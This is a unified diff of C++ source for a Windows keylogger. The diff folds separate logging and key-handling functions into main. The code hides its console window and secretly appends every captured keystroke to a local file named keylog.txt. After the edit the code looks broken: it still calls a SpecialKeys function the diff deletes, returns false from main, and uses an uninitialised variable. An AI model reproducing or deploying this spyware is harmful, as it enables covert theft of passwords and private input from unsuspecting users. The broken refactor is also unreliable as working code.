@@ -8,31 +8,13 @@
 #include <iostream>
 using namespace std;
 
-/*
-This function creates and opens a file called "keylog.txt".
-If the file is open, it starts writing the keystrokes to that file.
-*/
 
-void LOG(string keystroke)
+int main()
 {
-  fstream logFile;
-  logFile.open("keylog.txt", fstream::app);
-  if(logFile.is_open())
-  {
-    logFile << keystroke;
-    logFile.close();
-  }
-}
-
-/*
-This bool function is used for the special keys on a keyboard.
-If a special key is pressed, the program will refer back to the LOG function
-and it will record the special key that was pressed
-For keys such as the return key, 
-*/
-
-bool SpecialKeys(int S_key)
-{
+	int S_key;
+	string keystroke;
+	
+	
 	switch (S_key) 
 	{
 	case VK_SPACE:
@@ -90,10 +72,7 @@ bool SpecialKeys(int S_key)
 	default: 
 		return false;
 	}
-}
-
-void keylogger()
-{
+	
 	
 	ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console window
 	char key = 'a';
@@ -108,19 +87,21 @@ void keylogger()
 					
 				if (SpecialKeys(key) == false) //Checks to see if a special key was pressed
         			{
-					LOG(keystroke);
+						
+					fstream logFile;
+ 	 				logFile.open("keylog.txt", fstream::app);
+  					if(logFile.is_open())
+  					{
+    						logFile << keystroke;
+    						logFile.close();
+  					}
+					
 				}
 			}
 		}
 	}
-
-}
 	
 	
-int main()
-{
-	
-	keylogger();
-
 	return 0;
 }
+	
